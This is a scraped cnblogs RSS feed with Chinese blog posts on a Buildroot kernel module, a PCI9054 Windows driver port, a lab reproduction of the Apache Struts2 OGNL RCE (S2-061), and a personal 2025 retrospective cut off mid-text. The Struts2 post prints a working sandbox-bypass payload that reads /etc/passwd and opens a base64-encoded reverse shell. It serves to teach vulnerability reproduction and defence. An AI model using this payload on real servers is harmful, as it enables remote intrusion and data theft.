{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "编写一个Buildroot 驱动",
      "link": "https://www.cnblogs.com/tianwuyvlianshui/p/19494280",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/tianwuyvlianshui/p/19494280\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 22:45\">\n    <span>编写一个Buildroot 驱动</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"编写一个buildroot-驱动模块\">编写一个Buildroot 驱动模块</h1>\n<p>由于Buildroot 不支持ssh</p>\n<p>故采用adb调试</p>\n<h2 id=\"adb连接\">adb连接</h2>\n<h3 id=\"列出设备\">列出设备</h3>\n<pre><code>adb devices\n</code></pre>\n<p><img alt=\"image-20260116202202616\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224244254-2021753310.png\" /></p>\n<h3 id=\"连接设备\">连接设备</h3>\n<pre><code>adb shell\n</code></pre>\n<p><img alt=\"image-20260116202213317\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224245370-1464333835.png\" /></p>\n<h2 id=\"驱动模块编译交叉编译\">驱动模块编译(交叉编译)</h2>\n<h3 id=\"驱动模块源码\">驱动模块源码</h3>\n<pre><code class=\"language-c\">#include &lt;linux/module.h&gt;     /* 模块相关宏和函数 */\n#include &lt;linux/kernel.h&gt;     /* printk日志函数 */\n\n/* 加载函数（驱动入口），当驱动被 insmod 加载时自动执行 */\nstatic int __init helloworld_init(void)\n{\n    printk(\"helloworld_init\\r\\n\"); // 内核日志打印\n    return 0; // 返回0代表加载成功\n}\n\n/* 卸载函数（驱动出口），当驱动被 rmmod 卸载时自动执行 */\nstatic void __exit helloworld_exit(void)\n{\n    printk(\"helloworld_exit\\r\\n\");\n}\n\n/* 下面这两行，告诉内核入口和出口分别是哪两个函数 */\nmodule_init(helloworld_init);\nmodule_exit(helloworld_exit);\n\n/* 这3个是模块信息声明 */\nMODULE_LICENSE(\"GPL v2\");               /* 模块许可证 */\nMODULE_VERSION(\"1.0\");                  /* 模块版本，可选 */\nMODULE_DESCRIPTION(\"helloworld Driver\");/* 模块描述，可选，一般用于 lsmod 时显示 */\n</code></pre>\n<p>功能简单解释就是</p>\n<blockquote>\n<p>加载驱动：打印<strong>helloworld_init</strong></p>\n<p>卸载驱动：打印<strong>helloworld_exit</strong></p>\n</blockquote>\n<p>找到交叉编译工具路径</p>\n<pre><code>find prebuilts -name \"*gcc\" -type f\n</code></pre>\n<p><img alt=\"image-20260116221419705\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224245922-1390693708.png\" /></p>\n<p>一般在SDK路径下找</p>\n<h3 id=\"配置makefile\">配置Makefile</h3>\n<pre><code class=\"language-makefile\"># 目标架构\n# RK3566 是 ARM64 架构\nARCH ?= arm64\n\n# 交叉编译工具链前缀\n# 最终会使用：aarch64-linux-gnu-gcc / ld / objcopy 等\nCROSS_COMPILE ?= aarch64-linux-gnu-\n\n# Linux 内核源码目录\n# 必须是已经配置并且执行过 prepare/modules_prepare 的内核\n#作用：告诉 Makefile 用哪个内核版本的源码和头文件进行编译链接。\nKDIR := $(HOME)/Desktop/SDK/kernel\n\n# 当前外部模块源码所在目录\n# 内核会在这个目录下查找 obj-m 指定的模块源码\nPWD  := $(shell pwd)\n\n# 要编译的外部内核模块\n# hello_world.c  →  hello_world.ko\nobj-m += hello_world.o\n\n# 默认目标：编译内核模块\nall:\n\t# 调用内核源码目录下的 Makefile\n\t# M=$(PWD) 表示这是一个“外部模块”\n\t# ARCH / CROSS_COMPILE 指定目标架构和交叉编译器\n\t$(MAKE) -C $(KDIR) M=$(PWD) \\\n\t\tARCH=$(ARCH) CROSS_COMPILE=$(CROSS_COMPILE) modules\n\n# 清理编译生成的中间文件\nclean:\n\t$(MAKE) -C $(KDIR) M=$(PWD) clean\n\n</code></pre>\n<p>PS：主要寻找配置</p>\n<blockquote>\n<p>交叉编译工具链前缀：aarch64-linux-gnu-</p>\n<p>Linux 内核源码目录路径：$(HOME)/Desktop/SDK/kernel</p>\n</blockquote>\n<h3 id=\"编译\">编译</h3>\n<pre><code>make\n</code></pre>\n<p>模块输出路径</p>\n<p><img alt=\"image-20260116222818781\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224246555-359569486.png\" /></p>\n<h2 id=\"驱动测试\">驱动测试</h2>\n<h3 id=\"将驱动复制进rk3566板卡\">将驱动复制进rk3566板卡</h3>\n<h4 id=\"使用adb\">使用ADB</h4>\n<p>如果ADB已经连上板卡，则先断开连接</p>\n<pre><code>exit\n</code></pre>\n<p>寻找板卡设备</p>\n<pre><code>adb devices\n</code></pre>\n<p><img alt=\"image-20260116223436138\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224247234-648064983.png\" /></p>\n<p>将本地的驱动模块文件发送到板卡</p>\n<pre><code>adb -s 6c392aca38ad7c4b push F:\\Desktop\\SSH_Ubuntu18\\hello_world.ko /data/local/tmp/hello_world.ko\n</code></pre>\n<p><img alt=\"image-20260116223652779\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224248167-2138743187.png\" /></p>\n<h3 id=\"加载驱动模块\">加载驱动模块：</h3>\n<pre><code>insmod hello_world.ko\t\n</code></pre>\n<p>查看 驱动 相关日志</p>\n<pre><code>dmesg | grep -E 'hello'\t\n</code></pre>\n<p><img alt=\"image-20260116223813105\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224248958-58986670.png\" /></p>\n<h3 id=\"卸载模块驱动\">卸载模块驱动</h3>\n<pre><code>rmmod hello_world.ko\n</code></pre>\n<p>查看 驱动 相关日志</p>\n<pre><code>dmesg | grep -E 'hello'\t\n</code></pre>\n<p><img alt=\"image-20260116223939679\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224249850-1462602200.png\" /></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 22:45</span>&nbsp;\n<a href=\"https://www.cnblogs.com/tianwuyvlianshui\">沁拒离</a>&nbsp;\n阅读(<span id=\"post_view_count\">8</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "PCI9x5x驱动移植支持PCI9054在win7下使用1",
      "link": "https://www.cnblogs.com/haohaoganhuo/p/19493093",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/haohaoganhuo/p/19493093\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 17:06\">\n    <span>PCI9x5x驱动移植支持PCI9054在win7下使用1</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>本驱动最终目的是为了将北京中泰联创科技有限公司的一个数据采集卡老产品驱动升级成WDF框架的新驱动，老驱动使用Driver Studio开发，在64位操作系统下不够稳定，所以要升级成WDF框架。后续用老产品称呼实际硬件，老驱动称呼Driver Studio开发的驱动，新驱动称呼WDF框架驱动。</p>\n<p>开始的时候想使用Qoder直接分析老驱动后自动生成一个WDF框架驱动，结果没有成功，看来它并不是万能，编程过程中直接让他帮忙给些提示还是可以的，大家想要尝试Qoder可以在官网下载，也可以通过下面链接注册下载：<br />\n<a href=\"https://qoder.com/referral?referral_code=T0BDuCGlZU9RQTm4FyaG5cVIGi8wWaFX\" rel=\"noopener nofollow\" target=\"_blank\">Qoder下载链接</a></p>\n<h2 id=\"修改示例程序支持windows7\">修改示例程序支持Windows7</h2>\n<p>在“属性-Driver Settings-Target OS version”设置成windows7后，编译报告不支持1.19错误，改成1.11才能支持</p>\n<p>但是1.11下不支持WdfDmaTransactionSetSingleTransferRequirement函数，注释掉后才能正常编译，这个函数用于确定DMA是否需要单次传输完所有数据，在本驱动中，可以通过同步IO来解决这个问题，后面再说</p>\n<h2 id=\"在目标机器上搭建调试环境\">在目标机器上搭建调试环境</h2>\n<p>首先在windows11上配置，后续再使用windows7。</p>\n<h3 id=\"支持实验签名\">支持实验签名</h3>\n<p>64位系统必须得有数字签名才能够安装驱动，VS2017+WDK的编译环境可以自动加测试签名，所以只要将目标机开启TestSigning即可，这部分可以自行百度，或者直接使用签名工具“Windows 64Signer V1.2.exe”，它除了给驱动签名，还能开启TestSigning。</p>\n<h3 id=\"支持内核信息输出\">支持内核信息输出</h3>\n<p>debugview是可以显示内核信息的，但是示例驱动中使用WPP（Windows Software Trace Preprocessor）方式跟踪代码流程，需要进行一定的转换才能显示在debugview中，所以暂时先不使用debugview显示。</p>\n<p>在Windows11下比较简单就可以使用工具显示WPP的输出信息，直接将WDK安装目录的可执行文件夹复制到目标机器即可，我的目录是：<br />\nC:\\Program Files (x86)\\Windows Kits\\10\\Tools\\x64<br />\n将x64目录整个复制到目标机，然后以管理员身份运行运行traceview.exe<br />\n初次运行需要File-\"Create New Log Session\"-\"PDB（Debug Information） File\"<br />\n选择编译目录的Pci9x5x.pdb</p>\n<p>然后就能看到在驱动中输出的信息了。</p>\n<h2 id=\"寄存器定义\">寄存器定义</h2>\n<p>PCI9656与PCI9054在基地址、中断以及DMA操作方面的定义完全一样，只有其它一些没用到的功能定义不同，所以稍加改动就可以使用示例程序中的寄存器头文件。</p>\n<h2 id=\"分配资源\">分配资源</h2>\n<p>PLxPrepareHardware函数中分配资源<br />\n对于PCI总线，驱动使用BAR这个概念来分配寄存器资源，BAR是\"Base Address Register\"的缩写，也就是基地址寄存器，32位PCI总线最多6个BAR，根据找到顺序的不同，从BAR0~BAR5。</p>\n<h3 id=\"老驱动中9054分配资源操作\">老驱动中9054分配资源操作：</h3>\n<p>按照资源序号：</p>\n<ul>\n<li>BAR3对应本地译码地址，读写操作FPGA\n<ul>\n<li>应用层读写IO使用</li>\n</ul>\n</li>\n<li>BAR2对应本地译码地址，读写操作FPGA\n<ul>\n<li>内核操作使用</li>\n</ul>\n</li>\n<li>BAR1对应PCI9054地址，读写操作9054</li>\n</ul>\n<p>不知道为何老驱动使用了两个BAR来操作相同的本地总线，新驱动应该使用一个即可。</p>\n<h3 id=\"新驱动中资源分配操作\">新驱动中资源分配操作：</h3>\n<p>下面是PCI9656开发板的资源分配：</p>\n<ul>\n<li>找到内存方式且长度对应0x200，则对应BAR0，地址映射给Regs，直接使用结构体内成员来操作寄存器。</li>\n<li>找到IO方式且长度大于或者等于0x100，则对应BAR1，后续并没有处理这个资源。</li>\n<li>第一次找到内存方式且长度对应0x20000，则对应BAR2，后面映射地址给SRAMBase，但是也没有用到这个地址。</li>\n<li>第二次找到内存方式且长度对应0x20000，则对应BAR3，实际上后面没有处理这个资源</li>\n</ul>\n<p>对于老产品，总的资源数量有9个，分配情况如下</p>\n<ul>\n<li>0 内存资源，长度=256（BAR0）</li>\n<li>1 129号资源，设备私有资源，应该用不到</li>\n<li>2 IO资源，长度256，PCI9054地址（BAR1）</li>\n<li>3 129号资源，设备私有资源，应该用不到</li>\n<li>4 内存资源，长度131,072（0x20000），这个应该是最早9054开发板的资源分配信息，老产品保留了这个设置，实际应该对应本地地址，操作FPGA。（BAR2）</li>\n<li>5 129号资源，设备私有资源，应该用不到</li>\n<li>6 IO资源，长度256，本地地址，操作FPGA（BAR3）</li>\n<li>7 129号资源，设备私有资源，应该用不到</li>\n<li>8 中断资源，这个以后再处理。<br />\n之前无法确定哪个资源对应本地IO，因此需要测试52地址是否能返回0x3100来判断，如果返回0x3100则说明是本地IO<br />\n经过测试后，6号资源（BAR2）对应本地寄存器，2号资源（BAR1）对应PCI9054寄存器。他们都是IO资源，可以直接使用READ_PORT_ULONG和WRITE_PORT_ULONG进行读写操作。内存资源需要使用“LocalMmMapIoSpace”函数转换后，才能使用WRITE_REGISTER_ULONG和READ_REGISTER_ULONG操作。个人感觉IO资源操作更方便，所以所有寄存器操作均使用IO资源。</li>\n</ul>\n<p>仿照示例驱动，先找到的IO资源是PCI9054地址，后找到的IO资源是本地资源。修改后的代码如下：</p>\n<pre><code class=\"language-c\">case CmResourceTypePort:\n//分配IO资源\n  bar = NULL;\n\n  if (!foundLocalPort &amp;&amp; !found9054Port &amp;&amp;\n      desc-&gt;u.Port.Length == 0x100) {\n        found9054Port = TRUE;\n        bar = \"BAR1-9054\";\n        DevExt-&gt;Regs = (PPCI9656_REGS)UlongToPtr(desc-&gt;u.Port.Start.QuadPart);\n        DevExt-&gt;RegsLength = regsLength;\n      }\n      else if (!foundLocalPort &amp;&amp; \n                desc-&gt;u.Port.Length == 0x100) {\n        foundLocalPort = TRUE;\n        bar = \"BAR3-FPGA\";\n        DevExt-&gt;addrLocal = (PUCHAR)UlongToPtr(desc-&gt;u.Port.Start.QuadPart);\n        DevExt-&gt;localLength = desc-&gt;u.Port.Length;\n      }\n\n      TraceEvents(TRACE_LEVEL_INFORMATION, DBG_PNP,\n                  \" - Port   Resource [%08I64X-%08I64X], %s, i:%d length:%d\",\n                    desc-&gt;u.Port.Start.QuadPart,\n                    desc-&gt;u.Port.Start.QuadPart +\n                    desc-&gt;u.Port.Length,\n                    (bar) ? bar : \"&lt;unrecognized&gt;\",\n                    i,\n                    desc-&gt;u.Port.Length);\nbreak;\n</code></pre>\n<p>至此，资源分配部分代码完成，后续要修改其它具体操作。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 17:06</span>&nbsp;\n<a href=\"https://www.cnblogs.com/haohaoganhuo\">自由的好好干活</a>&nbsp;\n阅读(<span id=\"post_view_count\">54</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Apache Struts2 OGNL RCE注入",
      "link": "https://www.cnblogs.com/hzhsec/p/19492577",
      "published": "",
      "description": "<h2>\n\t\t\t<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/hzhsec/p/19492577\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 16:02\">\n    <span>Apache Struts2 OGNL RCE注入</span>\n    \n\n</a>\n\n\t\t</h2>\n\t\t    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        Apache Struts2 OGNL RCE漏洞是一种严重的远程代码执行漏洞，攻击者通过构造恶意的OGNL表达式注入到HTTP请求参数中，利用Struts2框架对OGNL表达式处理不当的缺陷，绕过安全沙箱限制，最终实现在目标服务器上执行任意系统命令，从而获取服务器控制权。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"1什么是apache-struts2\">1.什么是Apache Struts2?</h2>\n<p>Apache Struts2（也称为 Struts2）是一个开源的 Java Web 应用框架。<br />\n它主要用于构建企业级 <code>Java EE Web</code> 应用程序，提供 <code>MVC</code>（<code>Model-View-Controller</code>）架构支持，帮助开发者快速开发可维护的 Web 应用。</p>\n<p>Struts2 基于 <code>OGNL</code>（<code>Object-Graph Navigation Language</code>）表达式语言来处理数据绑定、表单验证和动态内容渲染等功能。它是 <code>Struts1</code> 的后继版本，从 2006 年左右开始流行，但由于历史漏洞较多，现在许多项目已转向更现代的框架如 Spring MVC。</p>\n<h2 id=\"2原理\">2.原理</h2>\n<p>(1) <strong>OGNL</strong></p>\n<p><strong>OGNL三要素</strong></p>\n<ol>\n<li>\n<p><strong>Expression（表达式）</strong> 字符串形式的指令，告诉 OGNL “你要做什么”。 例子：<code>user.name</code>、<code>@java.lang.Runtime@getRuntime().exec('calc')</code>、<code>#session.get('user')</code> 等</p>\n</li>\n<li>\n<p><strong>Root（根对象）</strong> 操作的“主体对象”，也就是你主要想访问/修改的对象。 在 Struts2 中，<strong>Root 默认就是 ValueStack（值栈）</strong>，值栈最顶层通常是当前的 Action 实例。 → 访问 Root 对象的属性时，<strong>不需要加任何前缀</strong>，直接写属性名即可。</p>\n</li>\n<li>\n<p><strong>Context（上下文）</strong> 一个 Map 结构（OgnlContext），相当于“运行环境”。 里面存放了各种辅助对象、临时变量、环境信息等。 在 Struts2 中，<strong>Context 就是 ActionContext</strong>，包含了：</p>\n<ul>\n<li><code>#parameters</code>（请求参数）</li>\n<li><code>#request</code></li>\n<li><code>#session</code></li>\n<li><code>#application</code></li>\n<li><code>#attr</code>（依次查找 page→request→session→application）</li>\n<li>值栈本身（作为 Root）<br />\n→ 访问 Context 里的对象，必须加 <strong>#</strong> 前缀，例如 <code>#session.user</code>、<code>#parameters.name</code></li>\n</ul>\n</li>\n</ol>\n<p><strong>OGNL中的重要符号</strong></p>\n<p>有三个<code>#%$</code><br />\n<code>%</code></p>\n<pre><code>%: 其用途是在标志属性为字符串类型时，计算OGNL表达式的值，类似JS中的函数eval()。 \n例如:&lt;s:url value =“%{items.{title}[0]}”/&gt;。获取items对象中title属性，title为数组，取数组索引为0位置的值\n</code></pre>\n<p><code>#</code></p>\n<pre><code>访问 Context（非根对象）里的数据,取 session、request、parameters、application 等时使用\n例如:#session.user #parameters.username #request.get('key')\n</code></pre>\n<p><code>$</code></p>\n<pre><code>1. 在 struts.xml 配置文件里引用 OGNL\n2. 在国际化资源文件（.properties）里引用 OGNL\n例如:struts.xml 里： 资源文件：welcome=${user.name}\n</code></pre>\n<p>(2) <strong>OGNL RCE漏洞原理</strong></p>\n<p>OGNL RCE漏洞是 <code>Struts2</code> 中一类常见的严重安全问题，主要源于框架对 <code>OGNL</code> 表达式的处理不当。</p>\n<p><code>OGNL</code> 是一种强大的表达式语言，用于访问 Java 对象的属性和方法.但在 <code>Struts2</code> 中，如果用户输入（如 <code>HTTP</code> 请求头、参数或标签属性）被直接用于 <code>OGNL</code> 求值，而没有充分验证或转义，就会导致注入攻击。</p>\n<p><strong>漏洞影响范围</strong></p>\n<p>OGNL RCE 漏洞影响了 <code>Struts2</code> 的多个历史版本：</p>\n<ul>\n<li>常见受影响版本：从 <code>Struts 2.0.0</code> 到 <code>2.5.x </code>系列（如 <code>2.5.25</code> 之前），部分 6.x 早期版本有类似问题。但许多旧版本（如 2.3.x）已停止支持（EOL）。<br />\n不是所有 <code>Struts2</code> 应用都易受攻击，取决于配置（如是否使用强制 <code>OGNL</code> 求值或暴露了特定插件）。但遗留系统特别危险。</li>\n</ul>\n<h2 id=\"3漏洞复现\">3.漏洞复现</h2>\n<p>漏洞复现环境<br />\n准备好<code>docker</code></p>\n<ol>\n<li><strong>靶机环境</strong>（使用 vulhub靶场）：</li>\n</ol>\n<pre><code class=\"language-bash\">克隆vulhub仓库\ngit clone --depth 1 https://github.com/vulhub/vulhub.git\n到漏洞地址\ncd vulhub/struts2/s2-061\n</code></pre>\n<p>拉取镜像</p>\n<pre><code class=\"language-sh\">docker-compose up -d \n</code></pre>\n<p>拉取失败的可以使用这个仓库的镜像源配置工具:</p>\n<pre><code class=\"language-sh\">git clone https://github.com/hzhsec/docker_proxy.git\nchmod +x *.sh\n./docker-proxy.sh\n</code></pre>\n<p>再拉取</p>\n<pre><code class=\"language-sh\">docker-compose up -d \n</code></pre>\n<p>使用docker ps查看镜像是否运行</p>\n<p>访问：<a href=\"http://xn--IP-eo8d177o:8080\" rel=\"noopener nofollow\" target=\"_blank\">http://靶机IP:8080</a><br />\n<img alt=\"image.png\" class=\"lazyload\" /></p>\n<ul>\n<li>尝试id注入代码</li>\n</ul>\n<pre><code>http://192.168.41.128:8080/.action?id=%{'hzhsec'+(1+2).toString()}\nurl编码\nhttp://192.168.41.128:8080/.action?id=%25%7B'hzhsec'%2B(1%2B2).toString()%7D\n</code></pre>\n<p><img alt=\"image.png\" class=\"lazyload\" /><br />\n成功将id的值更换执行</p>\n<p>尝试poc</p>\n<pre><code>%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]). (#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]). (#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)). (#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")). (#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)). (#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"cat /etc/passwd\")). (#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}\n\n编码:\n%25%7B(%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D).%20(%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D).%20(%23bean%3D%23instancemanager.newInstance(%22org.apache.commons.collections.BeanMap%22)).(%23bean.setBean(%23stack)).%20(%23context%3D%23bean.get(%22context%22)).(%23bean.setBean(%23context)).(%23macc%3D%23bean.get(%22memberAccess%22)).%20(%23bean.setBean(%23macc)).(%23emptyset%3D%23instancemanager.newInstance(%22java.util.HashSet%22)).(%23bean.put(%22excludedClasses%22%2C%23emptyset)).(%23bean.put(%22excludedPackageNames%22%2C%23emptyset)).%20(%23arglist%3D%23instancemanager.newInstance(%22java.util.ArrayList%22)).(%23arglist.add(%22cat%20%2Fetc%2Fpasswd%22)).%20(%23execute%3D%23instancemanager.newInstance(%22freemarker.template.utility.Execute%22)).(%23execute.exec(%23arglist))%7D\n</code></pre>\n<p><img alt=\"image.png\" class=\"lazyload\" /><br />\n成功读取<code>/etc/passwd</code><br />\n<img alt=\"image.png\" class=\"lazyload\" /></p>\n<p>尝试修改命令反弹shell</p>\n<pre><code>shell命令\nbash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAyLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}\n替换上面的cat命令\n</code></pre>\n<p>攻击机:</p>\n<pre><code>nc -lvvp 4444 启动监听\n</code></pre>\n<p><img alt=\"image.png\" class=\"lazyload\" /><br />\n发送payload</p>\n<pre><code>http://192.168.41.128:8080/.action?id=%25%7B(%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D).%20(%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D).%20(%23bean%3D%23instancemanager.newInstance(%22org.apache.commons.collections.BeanMap%22)).(%23bean.setBean(%23stack)).%20(%23context%3D%23bean.get(%22context%22)).(%23bean.setBean(%23context)).(%23macc%3D%23bean.get(%22memberAccess%22)).%20(%23bean.setBean(%23macc)).(%23emptyset%3D%23instancemanager.newInstance(%22java.util.HashSet%22)).(%23bean.put(%22excludedClasses%22%2C%23emptyset)).(%23bean.put(%22excludedPackageNames%22%2C%23emptyset)).%20(%23arglist%3D%23instancemanager.newInstance(%22java.util.ArrayList%22)).(%23arglist.add(%22bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4yMTAuNjYuMTA4LzQ0NDQgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22)).%20(%23execute%3D%23instancemanager.newInstance(%22freemarker.template.utility.Execute%22)).(%23execute.exec(%23arglist))%7D\n</code></pre>\n<p>成功上线:<br />\n<img alt=\"image.png\" class=\"lazyload\" /></p>\n<h3 id=\"poc原理\">poc原理</h3>\n<ol>\n<li>\n<p><strong>获取 Tomcat 的 InstanceManager</strong> <code>#instancemanager</code> = <code>#application[\"org.apache.tomcat.InstanceManager\"]</code> → 从 <code>ServletContext</code>（application）里拿到<code> Tomcat</code> 的实例管理器，它能“暴力”new 出任何类的实例（即使 OGNL 沙箱不允许）。</p>\n</li>\n<li>\n<p><strong>拿到当前的 ValueStack（值栈）</strong> <code>#stack</code> = <code>#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]</code> → 值栈是 <code>Struts2</code> 的核心，里面存着 <code>Action</code>、<code>request</code>、<code>session</code> 等所有上下文信息。</p>\n</li>\n<li>\n<p><strong>用 <code>BeanMap</code> 魔法绕过访问限制</strong>（最核心的沙箱绕过技巧） <code>#bean</code> = <code>#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")</code> <code>#bean.setBean(#stack)</code> → 创建一个 <code>BeanMap</code>（一种能把任意对象当 Map 用的黑科技类），然后把值栈塞进去。 之后就能通过 <code>.get(\"context\")</code>、 <code>.get(\"memberAccess\")</code> 这种方式，访问原本不允许直接访问的私有字段。</p>\n</li>\n</ol>\n<p>继续链式操作： → 先拿到 <code>context</code> → 再拿到 <code>_memberAccess</code>（OGNL 的安全管理器对象，控制什么能执行、什么类被禁止）</p>\n<ol start=\"4\">\n<li>\n<p><strong>清空沙箱黑名单</strong>（真正解除限制） <code>#emptyset = #instancemanager.newInstance(\"java.util.HashSet\") </code> <code>#bean.put(\"excludedClasses\", #emptyset)</code> <code>#bean.put(\"excludedPackageNames\", #emptyset)</code> → 把 OGNL 的两个黑名单（禁止的类 + 禁止的包）全部清空成空集合。 → 从此 OGNL 什么类都能用了，什么包都能访问了（沙箱彻底失效）。</p>\n</li>\n<li>\n<p><strong>准备命令并执行</strong> <code>#arglist</code> = <code>#instancemanager.newInstance(\"java.util.ArrayList\")</code> <code>#arglist.add(\"cat /etc/passwd\")</code> → 创建一个参数列表，里面放要执行的命令。</p>\n</li>\n</ol>\n<p><code>#execute</code> = <code>#instancemanager.newInstance(\"freemarker.template.utility.Execute\") #execute.exec(#arglist)</code> → 用 Freemarker 自带的 Execute 工具类来执行系统命令（这个类本来不允许被 OGNL 调用，但现在沙箱没了，就能用了）。</p>\n<p>**总结： 这个payload 先用 Tomcat InstanceManager + BeanMap 魔法链 → 找到并修改 OGNL 的安全管理器 → 清空所有黑名单 → 最后用 Freemarker 的 Execute 类执行 cat /etc/passwd。</p>\n<h2 id=\"4漏洞防御\">4.<strong>漏洞防御</strong></h2>\n<p>1、升级到Struts 2的安全版本，比如<code>2.3.32</code>或<code>2.5.16</code>，这些版本包含了对应的安全修复<br />\n2、禁用OGNL表达式的执行，或者使用Struts 2的安全<code>mechansim</code>。</p>\n<p><strong>免责声明</strong><br />\n本文档所包含的漏洞复现方法、技术细节及利用代码，<strong>仅限用于授权的安全测试、教育学习与研究目的</strong>。<br />\n<strong>严禁</strong>在未获得明确授权的情况下，对任何系统进行测试或攻击。任何不当使用所导致的法律责任及后果，均由使用者自行承担。<br />\n作者与文档提供者不承担任何因滥用本文档信息而产生的直接或间接责任。请遵守您所在地的法律法规，并始终践行负责任的网络安全实践。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n\t\t<p class=\"postfoot\">\n\t\t\tposted on \n<span id=\"post-date\">2026-01-16 16:02</span>&nbsp;\n<a href=\"https://www.cnblogs.com/hzhsec\">hzhsec</a>&nbsp;\n阅读(<span id=\"post_view_count\">13</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n\n\t\t</p>"
    },
    {
      "title": "我的2025：做项目、跑副业、见人、奔波、搬家、维权、再回上海",
      "link": "https://www.cnblogs.com/HaiJun-Aion/p/19492492",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/HaiJun-Aion/p/19492492\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 15:50\">\n    <span>我的2025：做项目、跑副业、见人、奔波、搬家、维权、再回上海</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>2025 年，如果让我用一句话定性，我会说：<strong>我在变强，也在重新选择自己的人生结构。</strong></p>\n<p>这一年我做了很多事，多到我一度不敢回头看。表面上看，我一直在“往前”：写内容、做项目、跑副业、见人、奔波、搬家、维权、再回上海。可只有我自己知道，真正折磨人的不是忙，是那种反复出现的瞬间——我突然意识到：我不是在冲，我是在<strong>被生活推着跑</strong>。</p>\n<p>我确实拿到了一些结果。内容有过爆的时刻，小红书涨了粉，视频剪辑从手忙脚乱到慢慢顺手，有人开始来问我、信我、甚至愿意付费。那段时间我有一种很罕见的笃定：只要我肯学、肯磨，很多事我都能做成。那种“我好像什么都能做”的自信，在这一年里反复把我从低谷里托起来。</p>\n<p>但同样是这一年，我也交了一笔不轻的学费。不是钱那么简单，更是对人、对机会、对“看起来很美”的承诺的那种天真。我曾因为信任做了一个很重的决定；也曾在北京的夜里把事情一条条摊开算清楚，最后发现不是值不值的问题，而是我再拖下去，就会把自己耗到没样子。</p>\n<p>我不想把这篇复盘写成流水账，也不想写成鸡汤。我只想把这一年最真实的部分摆出来：我怎么一点点变强，怎么被现实教育，怎么止损、怎么维权、怎么把自己从废墟里捡回来。</p>\n<hr />\n<h2 id=\"1-我开始把表达当成一件正事\">1. 我开始把表达当成一件正事</h2>\n<p>三月开始，我把很多注意力放在“说清楚”这件事上。</p>\n<p>以前我也输出，但更多像随手记录。2025 